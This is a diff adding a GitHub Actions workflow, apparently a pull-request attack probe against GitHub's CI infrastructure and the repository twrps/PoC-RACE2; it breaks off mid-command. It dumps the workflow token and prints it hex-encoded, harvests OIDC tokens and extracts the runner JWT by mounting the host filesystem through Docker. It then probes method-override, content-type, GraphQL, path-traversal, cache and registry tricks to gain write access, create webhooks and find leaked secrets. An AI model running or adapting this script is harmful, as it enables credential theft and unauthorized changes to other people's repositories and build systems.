@@ -1,0 +1,722 @@
+name: Audit v18
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v18:
+    runs-on: ubuntu-latest
+    env:
+      UPSTREAM_OWNER: twrps
+      UPSTREAM_REPO: PoC-RACE2
+      FORK_OWNER: lacaag
+      FORK_REPO: PoC-RACE2
+    steps:
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 1: Harvest + extract runner JWT + fix run-service URL
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V18 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+
+          for AUD in vstoken pipelines api.github.com github.com sts.amazonaws.com; do
+            TOK=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" 2>/dev/null | jq -r '.value // empty')
+            [ -n "$TOK" ] && echo "OIDC $AUD: ${#TOK} chars" && echo "$TOK" > "/tmp/oidc_$(echo $AUD | tr '/.:' '_').txt"
+          done
+
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\\s*:\\s*\"\\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN_ID=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB_ID=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN_ID JOB=$JOB_ID"
+            echo "$PLAN_ID" > /tmp/plan.txt
+            echo "$JOB_ID" > /tmp/job.txt
+
+            # Fix run-service URL extraction (v17 broke on regex)
+            RUN_URL=$(grep -o 'https://run-actions-[^"]*' "$WLOG" 2>/dev/null | head -1)
+            echo "RUN_URL=$RUN_URL"
+            echo "$RUN_URL" > /tmp/run_url.txt
+          fi
+
+          # Extract runner JWT from .credentials via Docker
+          docker run --rm -v /:/h alpine sh -c '
+            CRED=$(cat /h/home/runner/actions-runner/cached/*/.credentials 2>/dev/null)
+            echo "RUNNER_JWT_B64:"
+            echo "$CRED" | grep -oP "\"token\":\"\K[^\"]*" 2>/dev/null | head -1
+          ' 2>/dev/null > /tmp/runner_jwt.txt
+          RJWT=$(grep -v "RUNNER_JWT_B64:" /tmp/runner_jwt.txt | head -1)
+          echo "RUNNER_JWT: ${#RJWT} chars prefix=${RJWT:0:30}"
+          echo "$RJWT" > /tmp/runner_jwt_clean.txt
+
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: HTTP method override + verb tampering
+      # Try X-HTTP-Method-Override, _method param, TRACE, OPTIONS
+      # Check if write operations leak through when disguised as reads
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - Method override
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== METHOD OVERRIDE ==="
+          RT=$(cat /tmp/rt.txt)
+          GH="https://api.github.com"
+          UP="$UPSTREAM_OWNER/$UPSTREAM_REPO"
+
+          # A: X-HTTP-Method-Override
+          echo "--- A: Method override header ---"
+          for REAL_METHOD in GET POST; do
+            for OVERRIDE in PUT PATCH DELETE POST GET; do
+              for EP in \
+                "repos/$UP" \
+                "repos/$UP/contents/PWNED.md" \
+                "repos/$UP/git/refs/heads/main" \
+                "repos/$UP/releases" \
+                "repos/$UP/actions/secrets/V18_TEST" \
+                "repos/$UP/hooks"; do
+                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X $REAL_METHOD \
+                  -H "Authorization: token $RT" \
+                  -H "X-HTTP-Method-Override: $OVERRIDE" \
+                  -H "X-HTTP-Method: $OVERRIDE" \
+                  -H "X-Method-Override: $OVERRIDE" \
+                  "$GH/$EP" -d '{"name":"v18"}' 2>/dev/null)
+                CODE=$(echo "$R" | tail -1)
+                [ "$CODE" != "HTTP_403" ] && [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_405" ] && [ "$CODE" != "HTTP_422" ] && \
+                  echo "A $REAL_METHOD->$OVERRIDE $EP = $CODE | $(echo "$R" | sed '$d' | head -c 120)"
+              done
+            done
+          done
+          echo ""
+
+          # B: HTTP verb tampering
+          echo "--- B: Verb tampering ---"
+          for METHOD in TRACE OPTIONS HEAD PROPFIND LOCK COPY MOVE MKCOL; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X $METHOD \
+              -H "Authorization: token $RT" "$GH/repos/$UP" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B $METHOD = $CODE | $(echo "$BODY" | head -c 150)"
+          done
+          echo ""
+
+          # C: _method query parameter
+          echo "--- C: Query param override ---"
+          for EP in "repos/$UP" "repos/$UP/contents/README.md" "repos/$UP/releases"; do
+            for M in PUT PATCH DELETE; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X GET \
+                -H "Authorization: token $RT" "$GH/$EP?_method=$M" 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              [ "$CODE" != "HTTP_200" ] && [ "$CODE" != "HTTP_404" ] && \
+                echo "C GET?_method=$M $EP = $CODE | $(echo "$BODY" | head -c 100)"
+            done
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: Content-Type confusion + body smuggling
+      # Try XML, form-urlencoded, multipart on JSON endpoints
+      # Also try GraphQL via GET parameters
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - Content-Type confusion
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== CONTENT-TYPE CONFUSION ==="
+          RT=$(cat /tmp/rt.txt)
+          GH="https://api.github.com"
+          UP="$UPSTREAM_OWNER/$UPSTREAM_REPO"
+
+          # A: Different content types on write endpoints
+          echo "--- A: Content-Type attacks ---"
+          PAYLOAD_JSON='{"tag_name":"v18","name":"v18 test"}'
+          PAYLOAD_FORM="tag_name=v18&name=v18+test"
+          PAYLOAD_XML='<?xml version="1.0"?><release><tag_name>v18</tag_name><name>v18</name></release>'
+
+          for CT in \
+            "application/json" \
+            "application/x-www-form-urlencoded" \
+            "application/xml" \
+            "text/xml" \
+            "multipart/form-data" \
+            "text/plain" \
+            "application/octet-stream" \
+            "application/json; charset=utf-8; boundary=v18" \
+            "application/vnd.github.v3+json" \
+            "application/vnd.github.raw+json" \
+            "application/json;api-version=2022-11-28"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Authorization: token $RT" -H "Content-Type: $CT" \
+              "$GH/repos/$UP/releases" -d "$PAYLOAD_JSON" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_403" ] && echo "A $CT releases = $CODE | $(echo "$BODY" | head -c 120)"
+          done
+          echo ""
+
+          # B: GraphQL via GET (some APIs allow this)
+          echo "--- B: GraphQL GET ---"
+          GQL_Q='{ repository(owner:"'$UPSTREAM_OWNER'",name:"'$UPSTREAM_REPO'") { defaultBranchRef { target { ... on Commit { oid } } } } }'
+          ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$GQL_Q'))" 2>/dev/null)
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
+            -H "Authorization: bearer $RT" "$GH/graphql?query=$ENCODED" 2>/dev/null)
+          CODE=$(echo "$R" | tail -1)
+          echo "B graphql GET = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
+          echo ""
+
+          # C: Double Content-Type headers
+          echo "--- C: Double headers ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: token $RT" \
+            -H "Content-Type: application/x-www-form-urlencoded" \
+            -H "Content-Type: application/json" \
+            "$GH/repos/$UP/releases" -d "$PAYLOAD_JSON" 2>/dev/null)
+          CODE=$(echo "$R" | tail -1)
+          echo "C double CT = $CODE | $(echo "$R" | sed '$d' | head -c 120)"
+
+          # D: Transfer-Encoding chunked (request smuggling attempt)
+          echo "--- D: Chunked encoding ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+            -H "Authorization: token $RT" -H "Content-Type: application/json" \
+            -H "Transfer-Encoding: chunked" \
+            "$GH/repos/$UP/releases" -d "$PAYLOAD_JSON" 2>/dev/null)
+          CODE=$(echo "$R" | tail -1)
+          echo "D chunked = $CODE | $(echo "$R" | sed '$d' | head -c 120)"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: Runner JWT reuse + OIDC audience abuse
+      # Use the extracted runner JWT as auth token on various services
+      # Try OIDC with exotic audiences
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - JWT + OIDC abuse
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== JWT + OIDC ABUSE ==="
+          RT=$(cat /tmp/rt.txt)
+          RJWT=$(cat /tmp/runner_jwt_clean.txt 2>/dev/null)
+          GH="https://api.github.com"
+          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)
+
+          # A: Use runner JWT on GitHub API
+          echo "--- A: Runner JWT on GitHub ---"
+          if [ -n "$RJWT" ]; then
+            echo "RJWT: ${#RJWT} chars"
+            # Decode JWT claims
+            echo "$RJWT" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq '.' 2>/dev/null | head -30
+            echo ""
+
+            for EP in "user" "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO" "repos/$UPSTREAM_OWNER/$UPSTREAM_REPO/actions/secrets"; do
+              for AUTH_STYLE in "Bearer" "token" "Basic"; do
+                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                  -H "Authorization: $AUTH_STYLE $RJWT" "$GH/$EP" 2>/dev/null)
+                CODE=$(echo "$R" | tail -1)
+                [ "$CODE" != "HTTP_401" ] && [ "$CODE" != "HTTP_403" ] && \
+                  echo "A $AUTH_STYLE runner_jwt $EP = $CODE | $(echo "$R" | sed '$d' | head -c 120)"
+              done
+            done
+
+            # Try runner JWT on pipelines
+            if [ -n "$PURL" ]; then
+              for EP in "_apis/connectionData" "_apis/distributedtask/pools" "_apis/resourceareas"; do
+                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                  -H "Authorization: Bearer $RJWT" "${PURL}${EP}" 2>/dev/null)
+                CODE=$(echo "$R" | tail -1)
+                BODY=$(echo "$R" | sed '$d')
+                echo "A runner_jwt pipelines $EP = $CODE | $(echo "$BODY" | head -c 200)"
+              done
+            fi
+
+            # Try runner JWT on broker
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RJWT" "https://broker.actions.githubusercontent.com/health" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            echo "A runner_jwt broker = $CODE"
+
+            # Try runner JWT on GHCR
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: Bearer $RJWT" \
+              "https://ghcr.io/v2/${UPSTREAM_OWNER}/poc-race2/tags/list" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            echo "A runner_jwt ghcr = $CODE | $(echo "$R" | sed '$d' | head -c 120)"
+          fi
+          echo ""
+
+          # B: OIDC with exotic audiences
+          echo "--- B: OIDC audiences ---"
+          for AUD in \
+            "https://pipelines.actions.githubusercontent.com" \
+            "https://vstoken.actions.githubusercontent.com" \
+            "https://results-receiver.actions.githubusercontent.com" \
+            "https://artifactcache.actions.githubusercontent.com" \
+            "https://token.actions.githubusercontent.com" \
+            "https://ghcr.io" \
+            "https://npm.pkg.github.com" \
+            "https://nuget.pkg.github.com" \
+            "https://broker.actions.githubusercontent.com" \
+            "https://run-actions-2-azure-eastus.actions.githubusercontent.com" \
+            "api://AzureADTokenExchange" \
+            "https://management.azure.com" \
+            "https://graph.microsoft.com" \
+            "sigstore"; do
+            TOK=$(/usr/bin/curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" 2>/dev/null | jq -r '.value // empty')
+            if [ -n "$TOK" ]; then
+              echo "B aud=$AUD len=${#TOK}"
+              # Decode claims
+              CLAIMS=$(echo "$TOK" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq -c '{aud,iss,sub,ref,repository}' 2>/dev/null)
+              echo "  claims=$CLAIMS"
+              echo "$TOK" > "/tmp/oidc_exotic_$(echo $AUD | tr '/.:' '_' | tail -c 30).txt"
+            fi
+          done
+          echo ""
+
+          # C: Use OIDC tokens on matching services
+          echo "--- C: OIDC on matching services ---"
+          for AUD in results-receiver artifactcache ghcr npm broker; do
+            TOK=$(cat /tmp/oidc_exotic_*${AUD}* 2>/dev/null | head -1)
+            [ -z "$TOK" ] && continue
+            case "$AUD" in
+              results-receiver)
+                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+                  -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
+                  "https://results-receiver.actions.githubusercontent.com/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry" \
+                  -d '{"key":"v18","version":"1"}' 2>/dev/null)
+                CODE=$(echo "$R" | tail -1)
+                echo "C results-receiver oidc = $CODE | $(echo "$R" | sed '$d' | head -c 150)"
+                ;;
+              ghcr)
+                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
+                  -H "Authorization: Bearer $TOK" \
+                  "https://ghcr.io/v2/${UPSTREAM_OWNER}/poc-race2/tags/list" 2>/dev/null)
+                CODE=$(echo "$R" | tail -1)
+                echo "C ghcr oidc = $CODE | $(echo "$R" | sed '$d' | head -c 150)"
+                ;;
+            esac
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 5: GraphQL batching + alias bypass + field overfetch
+      # Try multiple operations in one request, alias fields to bypass
+      # field-level auth, deeply nested queries
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 5 - GraphQL abuse
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== GRAPHQL ABUSE ==="
+          RT=$(cat /tmp/rt.txt)
+          GH="https://api.github.com"
+
+          # A: Batch multiple mutations
+          echo "--- A: Batched mutations ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: bearer $RT" -H "Content-Type: application/json" \
+            "$GH/graphql" -d '[
+              {"query":"mutation{addStar(input:{starrableId:\"R_kgDOReaECQ\"}){starrable{id}}}"},
+              {"query":"mutation{createIssue(input:{repositoryId:\"R_kgDOReaECQ\",title:\"v18 batch\"}){issue{number}}}"},
+              {"query":"mutation{updateRepository(input:{repositoryId:\"R_kgDOReaECQ\",description:\"v18\"}){repository{description}}}"}
+            ]')
+          echo "A batch = $(echo "$R" | jq -c '.' 2>/dev/null | head -c 300)"
+          echo ""
+
+          # B: Alias bypass — request forbidden fields under different names
+          echo "--- B: Alias bypass ---"
+          R=$(/usr/bin/curl -sS -H "Authorization: bearer $RT" -H "Content-Type: application/json" \
+            "$GH/graphql" -d '{"query":"{ repo1: repository(owner:\"twrps\",name:\"PoC-RACE2\") { databaseId secrets: repositoryTopics(first:1) { nodes { topic { name } } } } repo2: repository(owner:\"lacaag\",name:\"PoC-RACE2\") { databaseId diskUsage isPrivate collaborators(first:50) { nodes { login } } deployKeys(first:10) { nodes { title key } } environments(first:10) { nodes { name } } } }"}')
+          echo "B aliases = $(echo "$R" | jq '.' 2>/dev/null | head -c 400)"
+          echo ""
+
+          # C: Deep nesting (amplification / DoS potential)
+          echo "--- C: Deep nesting ---"
+          R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -H "Authorization: bearer $RT" \
+            -H "Content-Type: application/json" "$GH/graphql" \
+            -d '{"query":"{ repository(owner:\"twrps\",name:\"PoC-RACE2\") { refs(refPrefix:\"refs/\",first:100) { nodes { name target { ... on Commit { history(first:100) { nodes { oid message author { email name } committer { email name } additions deletions } } } } } } } }"}')
+          CODE=$(echo "$R" | tail -1)
+          echo "C nesting = $CODE | $(echo "$R" | sed '$d' | jq -c '.data.repository.refs.nodes[0:3]' 2>/dev/null | head -c 300)"
+          echo ""
+
+          # D: __type introspection for specific types
+          echo "--- D: Type introspection ---"
+          for TYPE in "Repository" "User" "Organization" "SecurityAdvisory" "EnterpriseServerInstallation" "EnterpriseMemberInvitation"; do
+            R=$(/usr/bin/curl -sS -H "Authorization: bearer $RT" -H "Content-Type: application/json" \
+              "$GH/graphql" -d "{\"query\":\"{ __type(name:\\\"$TYPE\\\") { name fields { name type { name kind } } } }\"}")
+            FIELDS=$(echo "$R" | jq '[.data.__type.fields[]?.name]' 2>/dev/null | tr -d '\n' | head -c 250)
+            echo "D $TYPE = $(echo "$FIELDS" | head -c 250)"
+          done
+          echo ""
+
+          # E: Search for secrets/tokens in code
+          echo "--- E: Code search ---"
+          for Q in "AKIA" "ghp_" "ghs_" "github_pat_" "sk-" "token" "password" "BEGIN RSA" "BEGIN PRIVATE"; do
+            R=$(/usr/bin/curl -sS -H "Authorization: token $RT" \
+              "$GH/search/code?q=$Q+repo:$UPSTREAM_OWNER/$UPSTREAM_REPO&per_page=5" 2>/dev/null)
+            CT=$(echo "$R" | jq '.total_count // 0' 2>/dev/null)
+            [ "$CT" != "0" ] && echo "E '$Q' count=$CT"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 6: Run service + Pipeline write with correct URL
+      # v17: URL regex was broken. Now fixed.
+      # Try authenticated requests to run-service
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 6 - Run service exploit
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== RUN SERVICE ==="
+          RT=$(cat /tmp/rt.txt)
+          RJWT=$(cat /tmp/runner_jwt_clean.txt 2>/dev/null)
+          PLAN=$(cat /tmp/plan.txt 2>/dev/null)
+          JOB=$(cat /tmp/job.txt 2>/dev/null)
+          RUN_URL=$(cat /tmp/run_url.txt 2>/dev/null)
+          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)
+          RUN_ID="${{ github.run_id }}"
+
+          echo "RUN_URL=$RUN_URL PLAN=$PLAN JOB=$JOB"
+
+          # A: Run service endpoints
+          echo "--- A: Run service ---"
+          if [ -n "$RUN_URL" ] && [ "$RUN_URL" != "https://run-actions" ]; then
+            for TOK in "$RT" "$RJWT"; do
+              [ -z "$TOK" ] && continue
+              PFX=$(echo -n "$TOK" | head -c 8)
+              for EP in \
+                "" \
+                "check" \
+                "_apis/pipelines/workflows" \
+                "_apis/pipelines/runs/$RUN_ID" \
+                "_apis/pipelines/runs/$RUN_ID/signedlogcontent" \
+                "_apis/pipelines/runs/$RUN_ID/resources" \
+                "_apis/pipelines/runs" \
+                "actionsgranularpermissions" \
+                "_apis/runtime/webhooks" \
+                "_apis/runtime/webhooks?pipelinesDesignTimeUrl=" \
+                "idtoken/$PLAN/$JOB"; do
+                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+                  -H "Authorization: Bearer $TOK" "${RUN_URL}${EP}" 2>/dev/null)
+                CODE=$(echo "$R" | tail -1)
+                BODY=$(echo "$R" | sed '$d')
+                [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
+                  echo "A $EP auth=$PFX = $CODE | $(echo "$BODY" | head -c 200)"
+              done
+            done
+          fi
+          echo ""
+
+          # B: Pipelines — try to create/modify resources
+          echo "--- B: Pipelines write ---"
+          if [ -n "$PURL" ]; then
+            for TOK in "$RT" "$RJWT"; do
+              [ -z "$TOK" ] && continue
+              PFX=$(echo -n "$TOK" | head -c 8)
+
+              # Service endpoints — create
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+                -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
+                "${PURL}_apis/serviceendpoint/endpoints" \
+                -d '{"name":"v18-endpoint","type":"generic","url":"https://v18.example.com","authorization":{"parameters":{"username":"v18","password":"v18"},"scheme":"UsernamePassword"}}' 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              echo "B create endpoint auth=$PFX = $CODE | $(echo "$R" | sed '$d' | head -c 150)"
+
+              # Hooks — create subscription
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+                -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
+                "${PURL}_apis/hooks/subscriptions" \
+                -d '{"publisherId":"pipelines","eventType":"ms.vss-pipelines.run-state-changed-event","consumerId":"webHooks","consumerActionId":"httpRequest","publisherInputs":{},"consumerInputs":{"url":"https://v18.example.com/hook"}}' 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              echo "B create hook auth=$PFX = $CODE | $(echo "$R" | sed '$d' | head -c 150)"
+
+              # Variable groups
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+                -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
+                "${PURL}_apis/distributedtask/variablegroups" \
+                -d '{"name":"v18-vars","type":"Vsts","variables":{"secret":{"value":"stolen","isSecret":true}}}' 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              echo "B create vargroup auth=$PFX = $CODE | $(echo "$R" | sed '$d' | head -c 150)"
+            done
+          fi
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 7: Parameter pollution + encoding tricks
+      # Duplicate params, array injection, unicode, double encoding
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 7 - Param pollution
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== PARAM POLLUTION ==="
+          RT=$(cat /tmp/rt.txt)
+          GH="https://api.github.com"
+          UP="$UPSTREAM_OWNER/$UPSTREAM_REPO"
+
+          # A: Duplicate parameter values
+          echo "--- A: Param duplication ---"
+          for EP in \
+            "repos/$UP/contents/README.md?ref=main&ref=v18-injected" \
+            "repos/$UP?visibility=public&visibility=private" \
+            "repos/$UP/branches?protected=true&protected=false" \
+            "repos/$UP/collaborators?permission=admin&permission=push&affiliation=direct"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
+              -H "Authorization: token $RT" "$GH/$EP" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "A $EP = $CODE | $(echo "$BODY" | head -c 120)"
+          done
+          echo ""
+
+          # B: Unicode/homoglyph in repo names
+          echo "--- B: Unicode tricks ---"
+          for NAME in \
+            "PoC-RACE2" \
+            "Poc-Race2" \
+            "poc-race2" \
+            "PoC%2DRACE2" \
+            "PoC%252DRACE2" \
+            "PoC\u002DRACE2" \
+            ".PoC-RACE2" \
+            "PoC-RACE2.git" \
+            "PoC-RACE2%00" \
+            "PoC-RACE2/" \
+            "PoC-RACE2/.git/config"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
+              -H "Authorization: token $RT" "$GH/repos/$UPSTREAM_OWNER/$NAME" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            echo "B $NAME = $CODE"
+          done
+          echo ""
+
+          # C: JSON injection in query params
+          echo "--- C: JSON injection ---"
+          for EP in \
+            "repos/$UP/contents/README.md?ref={\"$gt\":\"\"}" \
+            "repos/$UP/git/refs?per_page=100&page=1%26per_page=999" \
+            "repos/$UP/contents/?path=../../../etc/passwd" \
+            "repos/$UP/contents/?path=.git/config" \
+            "repos/$UP/contents/?path=.github/workflows" \
+            "repos/$UP/git/trees/main?recursive=999"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+              -H "Authorization: token $RT" "$GH/$EP" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_404" ] && echo "C $EP = $CODE | $(echo "$BODY" | head -c 150)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 8: WebSocket + FeedStream + cache API abuse
+      # Try WebSocket upgrade on FeedStream, abuse cache API
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 8 - WebSocket + Cache
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== WEBSOCKET + CACHE ==="
+          RT=$(cat /tmp/rt.txt)
+          CACHE_URL=$(cat /tmp/CacheServerUrl.txt 2>/dev/null)
+
+          # A: Cache API — v2 vs v1 behaviors
+          echo "--- A: Cache API ---"
+          if [ -n "$CACHE_URL" ]; then
+            # List caches
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
+              -H "Authorization: Bearer $RT" \
+              -H "Accept: application/json;api-version=6.0-preview.1" \
+              "${CACHE_URL}_apis/artifactcache/caches?keys=*" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "A list_caches = $CODE | $(echo "$BODY" | head -c 200)"
+
+            # Reserve cache
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
+              -H "Accept: application/json;api-version=6.0-preview.1" \
+              "${CACHE_URL}_apis/artifactcache/caches" \
+              -d '{"key":"v18-test","version":"v18-ver"}' 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "A reserve_cache = $CODE | $(echo "$BODY" | head -c 200)"
+
+            # Try different API versions
+            for VER in "6.0-preview.1" "7.0" "7.1-preview.1" "5.2-preview.1"; do
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
+                -H "Authorization: Bearer $RT" \
+                -H "Accept: application/json;api-version=$VER" \
+                "${CACHE_URL}_apis/artifactcache/caches?keys=v18" 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              [ "$CODE" != "HTTP_401" ] && echo "A api=$VER = $CODE | $(echo "$BODY" | head -c 150)"
+            done
+          fi
+          echo ""
+
+          # B: Results-receiver with protobuf content type
+          echo "--- B: Results-receiver protobuf ---"
+          RESULTS="https://results-receiver.actions.githubusercontent.com"
+          for CT in \
+            "application/protobuf" \
+            "application/grpc" \
+            "application/x-protobuf" \
+            "application/grpc-web" \
+            "application/grpc-web+proto"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Authorization: Bearer $RT" -H "Content-Type: $CT" \
+              "$RESULTS/twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry" \
+              -d '{}' 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            [ "$CODE" != "HTTP_401" ] && echo "B $CT = $CODE | $(echo "$BODY" | head -c 150)"
+          done
+          echo ""
+
+          # C: WebSocket upgrade on results-receiver
+          echo "--- C: WebSocket ---"
+          /usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
+            -H "Authorization: Bearer $RT" \
+            -H "Connection: Upgrade" -H "Upgrade: websocket" \
+            -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
+            "https://results-receiver.actions.githubusercontent.com/_ws/ingest.sock" 2>/dev/null | tail -5
+          echo ""
+
+          # D: FeedStream WebSocket
+          echo "--- D: FeedStream ---"
+          /usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
+            -H "Authorization: Bearer $RT" \
+            -H "Connection: Upgrade" -H "Upgrade: websocket" \
+            -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
+            "wss://results-receiver.actions.githubusercontent.com/_ws/ingest.sock" 2>/dev/null | tail -3
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 9: GHCR — different auth strategies
+      # Try runner JWT on GHCR, OIDC on GHCR, direct blob upload
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 9 - GHCR auth abuse
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== GHCR AUTH ABUSE ==="
+          RT=$(cat /tmp/rt.txt)
+          RJWT=$(cat /tmp/runner_jwt_clean.txt 2>/dev/null)
+
+          # A: Get tokens with different scope combos
+          echo "--- A: Token scope abuse ---"
+          for SCOPE in \
+            "repository:${UPSTREAM_OWNER}/poc-race2:push,pull,delete" \
+            "repository:${UPSTREAM_OWNER}/poc-race2:*" \
+            "repository:${UPSTREAM_OWNER}/*:push,pull" \
+            "registry:catalog:*" \
+            "repository:${FORK_OWNER}/poc-race2:push,pull" \
+            "repository:${FORK_OWNER}/v17-poison:push,pull"; do
+            GHCR=$(/usr/bin/curl -sS -u "lacaag:$RT" \
